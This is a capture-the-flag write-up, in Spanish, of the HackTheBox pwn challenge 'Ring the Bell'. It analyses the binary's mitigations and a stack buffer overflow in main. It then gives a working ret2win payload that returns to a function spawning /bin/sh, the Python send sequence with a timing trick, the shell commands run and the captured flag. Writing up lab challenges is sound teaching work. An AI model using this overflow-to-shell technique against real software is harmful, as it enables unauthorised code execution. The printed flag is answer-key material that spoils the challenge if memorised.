# Ring the Bell: HackTheBox (Pwn)

**Flag:** `HTB{R1ng4_R1ng4_R1111111nG_3a0dd949fccf2ffa60a9308a9136710f}`

Remote: `154.57.164.82:32384`

---

## 1. Reconocimiento

```
$ file ring_the_bell
ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

Mitigaciones:

| Protección | Estado |
|------------|--------|
| PIE        | **No** (`ET_EXEC`, direcciones fijas `0x40xxxx`) |
| NX         | Sí (`GNU_STACK … RW`) |
| Canary     | **No** (sin `__stack_chk_fail`) |
| RELRO      | Full (`BIND_NOW`): irrelevante aquí |

Funciones interesantes (no *stripped*):

```
0040176d T bell     <- execl("/bin/sh", ...)
0040179b T main     <- overflow
```

## 2. La vulnerabilidad

`main` (`0x40179b`):

```c
char buf[32];              // rbp-0x20
memset(buf, 0, 32);
read(0, buf, 0x60);        // <-- lee 96 bytes en buffer de 32
info("D-d-did they hear us..?");
return 0;                  // leave; ret  -> RIP controlado
```

`read(0, buf, 0x60)` mete hasta **96 bytes** en un búfer de **32**. Sin canary,
el RIP guardado se sobrescribe directamente.

**Offset al RIP:** `0x20` (búfer) + `8` (rbp guardado) = **40**.
Confirmado devolviendo a `0xdeadbeef` → SIGSEGV (exit 139).

## 3. La función win

`bell` (`0x40176d`):

```asm
mov edx, 0                 ; envp = NULL
lea rsi, [rip+...] ; = "sh"        (0x40205f)
lea rdi, [rip+...] ; = "/bin/sh"   (0x402062)
call execl@plt             ; execl("/bin/sh", "sh", NULL)
```

Es un `ret2win` de libro: devolver a `bell` y ejecuta `/bin/sh`.

La pila ya está alineada a 16 en el `ret` de `main`, así que se puede saltar
directo a `bell` sin gadget `ret` de alineación (probado en local: `execl` no
revienta por `movaps`).

## 4. Exploit

```
payload = b"A"*40 + p64(0x40176d)
```

**Detalle clave de temporización:** el banner de intro está animado
(`usleep` carácter a carácter), así que `read()` se ejecuta con retardo. Hay que
enviar **solo** los 48 bytes del payload primero y esperar a que `read()` los
consuma (retorna con los 48 disponibles) **antes** de mandar comandos de shell;
si no, la lectura de 96 bytes se traga también los comandos y `sh` recibe EOF.

```python
s.sendall(b"A"*40 + p64(0x40176d))
time.sleep(3.0)                       # deja que termine el banner + read()
s.sendall(b"id; cat flag*\n")         # ya en /bin/sh
```

## 5. Resultado

```
===SHELL===
uid=999(ctf) gid=999(ctf) groups=999(ctf)
-rw-r--r--. 1 root root 60 flag.txt
HTB{R1ng4_R1ng4_R1111111nG_3a0dd949fccf2ffa60a9308a9136710f}
```

## Ficheros

- `ring_the_bell`: binario del reto
- `solve.py`: exploit remoto (socket puro, sin dependencias). `-i` para shell interactiva.
